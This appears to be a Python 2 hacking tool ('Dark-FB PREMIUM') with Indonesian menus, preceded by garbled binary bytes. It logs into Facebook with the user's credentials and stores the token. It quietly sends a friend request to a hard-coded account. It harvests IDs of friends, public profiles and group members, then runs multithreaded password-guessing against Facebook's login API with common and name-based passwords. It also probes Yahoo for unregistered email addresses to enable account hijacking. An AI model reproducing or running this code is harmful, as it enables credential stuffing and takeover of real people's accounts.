�%��K��Ű$=ɳ��-h��F�@]m���\S��i0;#t�����Ջ��:n���A�������ʖU
t�w����lfD��^rN-~����[�f��@v�O��xߙn�Y��ʨ�,�b����h�y��
GP�g�ɼ�mp��Ӳ̔[X��Z����r9n�OJ#fxV�t�NK���剂���jI}�"@}p�<�Ӕ]#!/usr/bin/python2
#coding=utf-8


import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,requests,mechanize
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from mechanize import Browser


reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]


def keluar():
	print "\033[1;91m[!] \x1b[1;97mExit Tool"
	os.sys.exit()


def acak(b):
    w = 'ahtdzjc'
    d = ''
    for i in x:
        d += '!'+w[random.randint(0,len(w)-1)]+i
    return cetak(d)


def cetak(b):
    w = 'ahtdzjc'
    for i in w:
        j = w.index(i)
        x= x.replace('!%s'%i,'\033[%s;1m'%str(31+j))
    x += '\033[0m'
    x = x.replace('!0','\033[0m')
    sys.stdout.write(x+'\n')


def jalan(z):
	for e in z + '\n':
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(00000.1)


##### LOGO #####
logo = """
\033[1;35m█████████
\033[1;36m█▄█████▄█      \033[1;32m«----------✧----------»
\033[1;33m█\033[1;92m▼▼▼▼▼ \033[1;92m- _ --_--\033[1;31m╔╦╗┌─┐┬─┐┬┌─   ╔═╗╔╗
\033[1;36m█ \033[1;92m \033[1;92m_-_-- -_ --__\033[1;93m ║║├─┤├┬┘├┴┐───╠╣ ╠╩╗
\033[1;37m█\033[1;92m▲▲▲▲▲\033[1;92m--  - _ --\033[1;96m═╩╝┴ ┴┴└─┴ ┴   ╚  ╚═╝ \033[1;96mPREMIUM v1.8
\033[1;31m█████████      \033[1;92m«----------✧----------»
\033[1;32m ██ ██
\033[1;37m╔═══════════════════════════════════════════════════╗
\033[1;37m║\033[1;96m* \033[1;93mAuthor  \033[1;93m:\033[1;32mKingTebe\033[1;93m                            \033[1;36m   
\033[1;37m║\033[1;96m* \033[1;93mGithub \033[1;93m :\033[1;32m\033[4mhttps://github.com/BlackHat-33\033[0m\033[1;93m \033[1;36m
\033[1;37m║\033[1;96m* \033[1;93mWasap   \033[1;93m:\033[1;32m082121902263 \033[1;36m
\033[1;37m╚═══════════════════════════════════════════════════╝"""


def tik():
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\033[1;96m[●] \x1b[1;92mSedang Masuk Silahkan Menunggu \x1b[1;97m"+o),;sys.stdout.flush();time.sleep(1)


back = 0
berhasil = []
cekpoint = []
oks = []
id = []
listgrup = []
vulnot = "\033[31mNot Vuln"
vuln = "\033[32mVuln"


os.system("clear")
print """\033[1;97m\033[1;91m

 @@@@@                                        @@@@@
@@@@@@@                                      @@@@@@@
@@@@@@@           @@@@@@@@@@@@@@@            @@@@@@@
 @@@@@@@@       @@@@@@@@@@@@@@@@@@@        @@@@@@@@
     @@@@@     @@@@@@@@@@@@@@@@@@@@@     @@@@@
       @@@@@  @@@@@@@@@@@@@@@@@@@@@@@  @@@@@
         @@  @@@@@@@@@@@@@@@@@@@@@@@@@  @@
            @@@@@@@    @@@@@@    @@@@@@
            @@@@@@      @@@@      @@@@@
            @@@@@@      @@@@      @@@@@
             @@@@@@    @@@@@@    @@@@@
              @@@@@@@@@@@  @@@@@@@@@@
               @@@@@@@@@@  @@@@@@@@@
           @@   @@@@@@@@@@@@@@@@@   @@
           @@@@  @@@@ K I N G @@@@  @@@@
          @@@@@   @@@ T E B E @@@   @@@@
        @@@@@      @@@@@@@@@@@@@      @@@@@                                       
   @@@@@              @@@@@@@              @@@@@                                      
   @@@@@                                   @@@@@ """
print "\x1b[1;97m<•••••••••••••••••••••••••••••••••••••••••••••••••>\033[1;91m"



CorrectUsername = "Tebe01"
CorrectPassword = "18"

loop = 'true'
while (loop == 'true'):
    username = raw_input("\033[1;91m[☆] \x1b[1;94mUSERNAME \x1b[1;97m: ")
    if (username == CorrectUsername):
    	password = raw_input("\033[1;91m[☆] \x1b[1;97mPASSWORD \x1b[1;91m: ")
        if (password == CorrectPassword):
            print "Allhamdullilah Login Berhasil " + username
            loop = 'false'
        else:
            print "PASSWORD SALAH GOBLOK!"
            os.system('xdg-open https://www.youtube.com/c/Black - IT')

def login():
	os.system('clear')
	try:
		toket = open('login.txt','r')
		menu() 
	except (KeyError,IOError):
		os.system('clear')
		print logo
		print 42*"\033[1;96m="
		print('\033[1;97m[☆] \x1b[1;96mLOGIN MENGGUNAKAN AKUN FB ANDA \x1b[1;97m[☆]' )
		id = raw_input('\033[1;96m[+] \x1b[1;33mEmail FB/ID \x1b[1;91m: \x1b[1;92m')
		pwd = raw_input('\x1b[1;91m[+] \x1b[1;37mPassword FB \x1b[1;91m: \x1b[1;92m')
		tik()
		try:
			br.open('https://m.facebook.com')
		except mechanize.URLError:
			print"\n\033[1;97m[!] \x1b[1;91mNo Net Connection"
			keluar()
		br._factory.is_html = True
		br.select_form(nr=0)
		br.form['email'] = id
		br.form['pass'] = pwd
		br.submit()
		url = br.geturl()
		if 'save-device' in url:
			try:
				sig= 'api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail='+id+'format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword='+pwd+'return_ssl_resources=0v=1.062f8ce9f74b12f84c123cc23437a4a32'
				data = {"api_key":"882a8490361da98702bf97a021ddc14d","credentials_type":"password","email":id,"format":"JSON", "generate_machine_id":"1","generate_session_cookies":"1","locale":"en_US","method":"auth.login","password":pwd,"return_ssl_resources":"0","v":"1.0"}
				x=hashlib.new("md5")
				x.update(sig)
				a=x.hexdigest()
				data.update({'sig':a})
				url = "https://api.facebook.com/restserver.php"
				r=requests.get(url,params=data)
				z=json.loads(r.text)
				unikers = open("login.txt", 'w')
				unikers.write(z['access_token'])
				unikers.close()
				print '\n\033[1;96m[✓] \x1b[1;92mLogin Berhasil'
				os.system('xdg-open https://www.youtube.com/c/Black - IT')
				requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
				menu()
			except requests.exceptions.ConnectionError:
				print"\n\033[1;96m[!] \x1b[1;91mNo Net Connection"
				keluar()
		if 'checkpoint' in url:
			print("\n\033[1;96m[!] \x1b[1;91mSorry your Account on Check point")
			os.system('rm -rf login.txt')
			time.sleep(1)
			keluar()
		else:
			print("\n\033[1;96m[!] \x1b[1;91mLogin Failed")
			os.system('rm -rf login.txt')
			time.sleep(1)
			login()


def menu():
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		os.system('clear')
		print"\033[1;96m[!] \x1b[1;91mToken invalid"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	try:
		otw = requests.get('https://graph.facebook.com/me?access_token='+toket)
		a = json.loads(otw.text)
		nama = a['name']
		id = a['id']
	except KeyError:
		os.system('clear')
		print"\033[1;96m[!] \033[1;91mSorry your Account on Check point"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	except requests.exceptions.ConnectionError:
		print"\033[1;96m[!] \x1b[1;91mNo Net Connection"
		keluar()
	os.system("clear")
	print logo
	print 42*"\033[1;96m="
	print "\033[1;96m[\033[1;92m✓\033[1;96m]\033[1;35m Name \033[1;91m: \033[1;32m"+nama+"\033[1;97m               "
	print "\033[1;96m[\033[1;97m✓\033[1;96m]\033[1;34m ID   \033[1;91m: \033[1;32m"+id+"\x1b[1;97m              "
	print 42*"\033[1;96m="
	print "\x1b[1;96m[\x1b[1;92m1\x1b[1;96m]\x1b[1;37m Hack Facebook "
	print "\x1b[1;96m[\x1b[1;92m2\x1b[1;96m]\x1b[1;36m Lihat Daftar Grup               "
	print "\x1b[1;96m[\x1b[1;92m3\x1b[1;96m]\x1b[1;33m Yahoo id clone               "
	print "\x1b[1;96m[\x1b[1;91m0\x1b[1;96m]\x1b[1;91m LogOut            "
	pilih()


def pilih():
	unikers = raw_input("\n\033[1;97m >>> \033[1;97m")
	if unikers =="":
		print "\033[1;96m[!] \x1b[1;91mFill in correctly"
		pilih()
	elif unikers =="1":
		super()
	elif unikers =="2":
		grupsaya()
	elif unikers =="3":
		yahoo()
	elif unikers =="0":
		jalan('Remove token successful')
		os.system('rm -rf login.txt')
		keluar()
	else:
		print "\033[1;96m[!] \x1b[1;91mFill in correctly"
		pilih()


def super():
	global toket
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\033[1;96m[!] \x1b[1;91mToken invalid"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	os.system('clear')
	print logo
	print 42*"\033[1;96m="
	print "\x1b[1;96m[\x1b[1;92m1\x1b[1;96m]\x1b[1;37m Hack Dari Daftar Teman"
	print "\x1b[1;96m[\x1b[1;92m2\x1b[1;96m]\x1b[1;36m Hack Dari Teman Public"
	print "\x1b[1;96m[\x1b[1;92m3\x1b[1;96m]\x1b[1;35m Hack Dari Grup"
	print "\x1b[1;96m[\x1b[1;92m4\x1b[1;96m]\x1b[1;93m Hack Dari File (buat wordlist anda)"
	print "\x1b[1;96m[\x1b[1;91m0\x1b[1;96m]\x1b[1;91m Kembali"
	pilih_super()

def pilih_super():
	peak = raw_input("\n\033[1;97m >>> \033[1;97m")
	if peak =="":
		print "\033[1;96m[!] \x1b[1;91mFill in correctly"
		pilih_super()
	elif peak =="1":
		os.system('clear')
		print logo
		print 42*"\033[1;96m="
		jalan('\033[1;96m[✺]\033[1;37mScanning ID Teman \033[1;97m...')
		r = requests.get("https://graph.facebook.com/me/friends?access_token="+toket)
		z = json.loads(r.text)
		for s in z['data']:
			id.append(s['id'])
	elif peak =="2":
		os.system('clear')
		print logo
		print 42*"\033[1;96m="
		idt = raw_input("\033[1;96m[+] \033[1;37mMasukkan ID Teman Kamu \033[1;91m: \033[1;32m")
		try:
			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			op = json.loads(jok.text)
			print"\033[1;96m[\033[1;97m✓\033[1;96m] \033[1;36mFriend's name       \033[1;91m :\033[1;32m "+op["name"]
		except KeyError:
			print"\033[1;96m[!] \x1b[1;91mFriends not found!"
			raw_input("\n\033[1;97m[\033[1;91mEnter Back\033[1;97m]")
			super()
		jalan('\033[1;35m[✺] \033[1;35mMohon Tunggu Mengambil ID \033[1;97m...')
		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+toket)
		z = json.loads(r.text)
		for i in z['data']:
			id.append(i['id'])
	elif peak =="3":
		os.system('clear')
		print logo
		print 42*"\033[1;96m="
		idg=raw_input('\033[1;96m[+] \033[1;37mMasukkan ID Grup \033[1;91m:\033[1;32m ')
		try:
			r=requests.get('https://graph.facebook.com/group/?id='+idg+'&access_token='+toket)
			asw=json.loads(r.text)
			print"\033[1;96m[\033[1;97m✓\033[1;96m] \033[1;36mNama grup     \033[1;91m:\033[1;32m "+asw['name']
		except KeyError:
			print"\033[1;96m[!] \x1b[1;91mGroup not found"
			raw_input("\n\033[1;96m[\033[1;97mKembali\033[1;96m]")
			super()
		jalan('\033[1;96m[✺] \033[1;93mMohon Tunggu Mengambil ID \033[1;97m...')
		re=requests.get('https://graph.facebook.com/'+idg+'/members?fields=name,id&limit=999999999&access_token='+toket)
		s=json.loads(re.text)
		for p in s['data']:
			id.append(p['id'])
	elif peak =="4":
		os.system('clear')
		print logo
		print 42*"\033[1;96m="
		try:
			idlist = raw_input('\x1b[1;96m[+] \x1b[1;37mMasukkan Nama File  \x1b[1;91m: \x1b[1;97m')
			for line in open(idlist,'r').readlines():
				id.append(line.strip())
		except IOError:
			print '\x1b[1;96m[!] \x1b[1;91mFile not found'
			raw_input('\n\x1b[1;96m[ \x1b[1;97mEnter Back \x1b[1;96m]')
			super()
	elif peak =="0":
		menu()
	else:
		print "\033[1;96m[!] \x1b[1;91mFill in correctly"
		pilih_super()
	
	print "\033[1;96m[+] \033[1;36mTotal ID \033[1;91m: \033[1;97m"+str(len(id))
	jalan('\033[1;32m[✺] \033[1;32mGasskeun Coeg \033[1;97m...')
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\033[1;96m[\033[1;97m✸\033[1;96m] \033[1;93mHacking \033[1;97m"+o),;sys.stdout.flush();time.sleep(1)
	print
	print('\x1b[1;31m[!] \x1b[1;31mStop CTRL+z')
	print 42*"\033[1;96m="
	
			
	def main(arg):
		global cekpoint,oks
		user = arg
		try:
			os.mkdir('out')
		except OSError:
			pass
		try:
			a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
			b = json.loads(a.text)
			pass1 = ('786786')
			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass1)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
			q = json.load(data)
			if 'access_token' in q:
				print '\x1b[1;96m[\x1b[1;92mBerhasil\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass1
				oks.append(user+pass1)
			else:
				if 'www.facebook.com' in q["error_msg"]:
					print '\x1b[1;96m[\x1b[1;93mCekpoint\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass1
					cek = open("out/super_cp.txt", "a")
					cek.write(user+"|"+pass1+"\n")
					cek.close()
					cekpoint.append(user+pass1)
				else:
					pass2 = b['first_name']+'12345'
					data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass2)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
					q = json.load(data)
					if 'access_token' in q:
						print '\x1b[1;96m[\x1b[1;92mBerhasil\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass2
						oks.append(user+pass2)
					else:
						if 'www.facebook.com' in q["error_msg"]:
							print '\x1b[1;96m[\x1b[1;93mCekpoint\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass2
							cek = open("out/super_cp.txt", "a")
							cek.write(user+"|"+pass2+"\n")
							cek.close()
							cekpoint.append(user+pass2)
						else:
							pass3 = b['last_name'] + '123'
							data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass3)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
							q = json.load(data)
							if 'access_token' in q:
								print '\x1b[1;96m[\x1b[1;92mBerhasil\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass3
								oks.append(user+pass3)
							else:
								if 'www.facebook.com' in q["error_msg"]:
									print '\x1b[1;96m[\x1b[1;93mCekpoint\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass3
									cek = open("out/super_cp.txt", "a")
									cek.write(user+"|"+pass3+"\n")
									cek.close()
									cekpoint.append(user+pass3)
								else:
									pass4 = 'Bangsat'
									data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass4)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
									q = json.load(data)
									if 'access_token' in q:
										print '\x1b[1;96m[\x1b[1;92mBerhasil\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass4
										oks.append(user+pass4)
									else:
										if 'www.facebook.com' in q["error_msg"]:
											print '\x1b[1;96m[\x1b[1;93mCekpoint\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass4
											cek = open("out/super_cp.txt", "a")
											cek.write(user+"|"+pass4+"\n")
											cek.close()
											cekpoint.append(user+pass4)
										else:
											pass5 = 'Sayang'
											data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass5)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
											q = json.load(data)
											if 'access_token' in q:
												print '\x1b[1;96m[\x1b[1;92mBerhasil\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass5
												oks.append(user+pass5)
											else:
												if 'www.facebook.com' in q["error_msg"]:
													print '\x1b[1;96m[\x1b[1;93mCekpoint\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass5
													cek = open("out/super_cp.txt", "a")
													cek.write(user+"|"+pass5+"\n")
													cek.close()
													cekpoint.append(user+pass5)
												else:
													pass6 = 'Kontol'
													data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass6)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
													q = json.load(data)
													if 'access_token' in q:
														print '\x1b[1;96m[\x1b[1;92mBerhasil\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass6
														oks.append(user+pass6)
													else:
														if 'www.facebook.com' in q["error_msg"]:
															print '\x1b[1;96m[\x1b[1;93mCekpoint\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass6
															cek = open("out/super_cp.txt", "a")
															cek.write(user+"|"+pass6+"\n")
															cek.close()
															cekpoint.append(user+pass6)
														else:
															a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
															b = json.loads(a.text)
															pass7 = 'Anjing'
															data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass7)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
															q = json.load(data)
															if 'access_token' in q:
																print '\x1b[1;96m[\x1b[1;92mBerhasil\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass7
																oks.append(user+pass7)
															else:
																if 'www.facebook.com' in q["error_msg"]:
																	print '\x1b[1;96m[\x1b[1;93mCekpoint\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass7
																	cek = open("out/super_cp.txt", "a")
																	cek.write(user+"|"+pass7+"\n")
																	cek.close()
																	cekpoint.append(user+pass7)
																	
															
		except:
			pass
		
	p = ThreadPool(30)
	p.map(main, id)
	print 42*"\033[1;96m="
	print '\033[1;96m[\033[1;97m✓\033[1;96m] \033[1;92mSuccessful \033[1;97m....'
	print"\033[1;96m[+] \033[1;92mTotal OK/\x1b[1;93mCP \033[1;91m: \033[1;92m"+str(len(oks))+"\033[1;97m/\033[1;93m"+str(len(cekpoint))
	print("\033[1;96m[+] \033[1;92mYour CP File Saved \033[1;91m: \033[1;97mout/super_cp.txt")
	raw_input("\n\033[1;96m[\033[1;97mEnter Back\033[1;96m]")
	super()


def grupsaya():
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\033[1;96m[!] \x1b[1;91mToken tidak ditemukan"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	try:
		os.mkdir('out')
	except OSError:
		pass
	os.system('clear')
	print logo
	print 42*"\033[1;96m="
	try:
		uh = requests.get('https://graph.facebook.com/me/groups?access_token='+toket)
		gud = json.loads(uh.text)
		for p in gud['data']:
			nama = p["name"]
			id = p["id"]
			f=open('out/Grupid.txt','w')
			listgrup.append(id)
			f.write(id + '\n')
			print "\033[1;96m[\033[1;92mGroup\033[1;96m]\x1b[1;97m "+str(id)+" \x1b[1;96m=>\x1b[1;97m "+str(nama)
		print 42*"\033[1;96m="
		print"\033[1;96m[+] \033[1;92mTotal Group \033[1;91m:\033[1;97m %s"%(len(listgrup))
		print("\033[1;96m[+] \033[1;92mTersimpan \033[1;91m: \033[1;97mout/Grupid.txt")
		f.close()
		raw_input("\n\033[1;96m[\033[1;97mKembali\033[1;96m]")
		menu()
	except (KeyboardInterrupt,EOFError):
		print("\033[1;96m[!] \x1b[1;91mTerhenti")
		raw_input("\n\033[1;96m[\033[1;97mKembali\033[1;96m]")
		menu()
	except KeyError:
		os.remove('out/Grupid.txt')
		print('\033[1;96m[!] \x1b[1;91mGroup tidak ditemukan')
		raw_input("\n\033[1;96m[\033[1;97mKembali\033[1;96m]")
		menu()
	except requests.exceptions.ConnectionError:
		print"\033[1;96m[✖] \x1b[1;91mTidak ada koneksi"
		keluar()
	except IOError:
		print "\033[1;96m[!] \x1b[1;91mError"
		raw_input("\n\033[1;96m[\033[1;97mKembali\033[1;96m]")
		menu()


def yahoo():
	global toket
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\033[1;91m[!] Token not found"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	os.system('clear')
	print logo
	print 42*"\033[1;96m="
	print "\x1b[1;96m[\x1b[1;92m1\x1b[1;96m]\x1b[1;37m Clone dari daftar teman"
	print "\x1b[1;96m[\x1b[1;92m2\x1b[1;96m]\x1b[1;36m Clone dari teman public"
	print "\x1b[1;96m[\x1b[1;92m3\x1b[1;96m]\x1b[1;35m Clone dari grup"
	print "\x1b[1;96m[\x1b[1;92m4\x1b[1;96m]\x1b[1;93m Clone dari file"
	print "\x1b[1;96m[\x1b[1;91m0\x1b[1;96m]\x1b[1;91m Kembali"
	clone()
       
def clone():
	embuh = raw_input("\n\x1b[1;97m >>> ")
	if embuh =="":
		print "\033[1;96m[!] \x1b[1;91mFill in correctly"
	elif embuh =="1":
		clone_dari_daftar_teman()
	elif embuh =="2":
		clone_dari_teman()
	elif embuh =="3":
		clone_dari_member_group()
	elif embuh =="4":
		clone_dari_file()
	elif embuh =="0":
		menu()
	else:
		print "\033[1;96m[!] \x1b[1;91mFill in correctly"
		

def clone_dari_daftar_teman():
	global toket
	os.system('reset')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\033[1;91m[!] Token Invalid"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	try:
		os.mkdir('out')
	except OSError:
		pass
	os.system('clear')
	print logo
	mpsh = []
	jml = 0
	print 42*"\033[1;96m="
	jalan('\033[1;96m[\x1b[1;97m✺\x1b[1;96m] \033[1;37mTake email \033[1;97m...')
	teman = requests.get('https://graph.facebook.com/me/friends?access_token='+toket)
	kimak = json.loads(teman.text)
	save = open('out/MailVuln.txt','w')
	jalan('\033[1;96m[\x1b[1;32m✺\x1b[1;96m] \033[1;32mStart \033[1;97m...')
	print ('\x1b[1;96m[!] \x1b[1;31mStop CTRL+z')
	print 42*"\033[1;97m="
	for w in kimak['data']:
		jml +=1
		mpsh.append(jml)
		id = w['id']
		nama = w['name']
		links = requests.get("https://graph.facebook.com/"+id+"?access_token="+toket)
		z = json.loads(links.text)
		try:
			mail = z['email']
			yahoo = re.compile(r'@.*')
			otw = yahoo.search(mail).group()
			if 'yahoo.com' in otw:
				br.open("https://login.yahoo.com/config/login?.src=fpctx&.intl=id&.lang=id-ID&.done=https://id.yahoo.com")
				br._factory.is_html = True
				br.select_form(nr=0)
				br["username"] = mail
				klik = br.submit().read()
				jok = re.compile(r'"messages.ERROR_INVALID_USERNAME">.*')
				try:
					pek = jok.search(klik).group()
				except:
					continue
				if '"messages.ERROR_INVALID_USERNAME">' in pek:
					save.write("Nama: "+ nama +"ID :" + id +"Email: "+ mail + '\n')
					print("\033[1;37m[\033[1;92mVuln\033[1;37m] \033[1;92m" +mail+" \033[1;96m[\x1b[1;97m"+nama)
					berhasil.append(mail)
		except KeyError:
			pass
	print 42*"\033[1;96m="
	print '\033[1;9m[\033[1;97m✓\033[1;96m] \033[1;92mSuccessful \033[1;97m....'
	print"\033[1;96m[+] \033[1;92mTotal \033[1;91m: \033[1;97m"+str(len(berhasil))
	print"\033[1;96m[+] \033[1;92mFile saved \033[1;91m:\033[1;97m out/MailVuln.txt"
	save.close()
	raw_input("\n\033[1;96m[\033[1;97mEnter Back\033[1;96m]")
	menu()


def clone_dari_teman():
	global toket
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\033[1;96m[!] \x1b[1;91mToken invalid"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	try:
		os.mkdir('out')
	except OSError:
		pass
	os.system('clear')
	print logo
	mpsh = []
	jml = 0
	print 42*"\033[1;96m="
	idt = raw_input("\033[1;96m[+] \033[1;37mEnter friend ID \033[1;91m: \033[1;32m")
	try:
		jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
		op = json.loads(jok.text)
		print"\033[1;96m[\033[1;97m✓\033[1;96m] \033[1;93mFB Name        \033[1;91m :\033[1;32m "+op["name"]
	except KeyError:
		print"\033[1;96m[!] \x1b[1;91mTeman tidak ditemukan"
		raw_input("\n\033[1;96m[\033[1;97mKembali\033[1;96m]")
		menu()
	jalan('\033[1;96m[✺] \033[1;36mTake email \033[1;97m...')
	teman = requests.get('https://graph.facebook.com/'+idt+'/friends?access_token='+toket)
	kimak = json.loads(teman.text)
	save = open('out/TemanMailVuln.txt','w')
	jalan('\033[1;32m[✺] \033[1;32mStart \033[1;97m...')
	print('\x1b[1;96m[!] \x1b[1;91mStop CTRL+z')
	print 43*"\033[1;97m="
	for w in kimak['data']:
		jml +=1
		mpsh.append(jml)
		id = w['id']
		nama = w['name']
		links = requests.get("https://graph.facebook.com/"+id+"?access_token="+toket)
		z = json.loads(links.text)
		try:
			mail = z['email']
			yahoo = re.compile(r'@.*')
			otw = yahoo.search(mail).group()
			if 'yahoo.com' in otw:
				br.open("https://login.yahoo.com/config/login?.src=fpctx&.intl=id&.lang=id-ID&.done=https://id.yahoo.com")
				br._factory.is_html = True
				br.select_form(nr=0)
				br["username"] = mail
				klik = br.submit().read()
				jok = re.compile(r'"messages.ERROR_INVALID_USERNAME">.*')
				try:
					pek = jok.search(klik).group()
				except:
					continue
				if '"messages.ERROR_INVALID_USERNAME">' in pek:
					save.write("Nama: "+ nama +"ID :" + id +"Email: "+ mail + '\n')
					print("\033[1;96m[\033[1;92mVULN✓\033[1;96m] \033[1;92m" +mail+" \033[1;96m=>\x1b[1;97m"+nama)
					berhasil.append(mail)
		except KeyError:
			pass
	print 42*"\033[1;96m="
	print '\033[1;96m[\033[1;97m✓\033[1;96m] \033[1;92mSuccessful \033[1;97m....'
	print"\033[1;96m[+] \033[1;92mTotal \033[1;91m: \033[1;97m"+str(len(berhasil))
	print"\033[1;96m[+] \033[1;92mFile saved \033[1;91m:\033[1;97m out/TemanMailVuln.txt"
	save.close()
	raw_input("\n\033[1;96m[\033[1;97mEnter Back\033[1;96m]")
	menu()
	
def clone_dari_member_group():
	global toket
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\033[1;96m[!] \x1b[1;91mToken invalid"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	try:
		os.mkdir('out')
	except OSError:
		pass
	os.system('clear')
	print logo
	mpsh = []
	jml = 0
	print 42*"\033[1;96m="
	id=raw_input('\033[1;96m[+] \033[1;37mEnter group ID \033[1;91m:\033[1;92m ')
	try:
		r=requests.get('https://graph.facebook.com/group/?id='+id+'&access_token='+toket)
		asw=json.loads(r.text)
		print"\033[1;96m[\033[1;97m✓\033[1;96m] \033[1;96mName group     \033[1;91m:\033[1;92m "+asw['name']
	except KeyError:
		print"\033[1;96m[!] \x1b[1;91mGroup not found"
		raw_input("\n\033[1;96m[\033[1;97mEnter Back\033[1;96m]")
		menu()
	jalan('\033[1;96m[✺] \033[1;93mTake email \033[1;97m...')
	teman = requests.get('https://graph.facebook.com/'+id+'/members?fields=name,id&limit=999999999&access_token='+toket)
	kimak = json.loads(teman.text)
	save = open('out/GrupMailVuln.txt','w')
	jalan('\033[1;92m[✺] \033[1;92mStart \033[1;97m...')
	print('\x1b[1;96m[!] \x1b[1;91mStop CTRL+z')
	print 42*"\033[1;97m="
	for w in kimak['data']:
		jml +=1
		mpsh.append(jml)
		id = w['id']
		nama = w['name']
		links = requests.get("https://graph.facebook.com/"+id+"?access_token="+toket)
		z = json.loads(links.text)
		try:
			mail = z['email']
			yahoo = re.compile(r'@.*')
			otw = yahoo.search(mail).group()
			if 'yahoo.com' in otw:
				br.open("https://login.yahoo.com/config/login?.src=fpctx&.intl=id&.lang=id-ID&.done=https://id.yahoo.com")
				br._factory.is_html = True
				br.select_form(nr=0)
				br["username"] = mail
				klik = br.submit().read()
				jok = re.compile(r'"messages.ERROR_INVALID_USERNAME">.*')
				try:
					pek = jok.search(klik).group()
				except:
					continue
				if '"messages.ERROR_INVALID_USERNAME">' in pek:
					save.write("Nama: "+ nama +"ID :" + id +"Email: "+ mail + '\n')
					print("\033[1;96m[\033[1;97mVULN✓\033[1;96m] \033[1;92m" +mail+" \033[1;96m=>\x1b[1;97m"+nama)
					berhasil.append(mail)
		except KeyError:
			pass
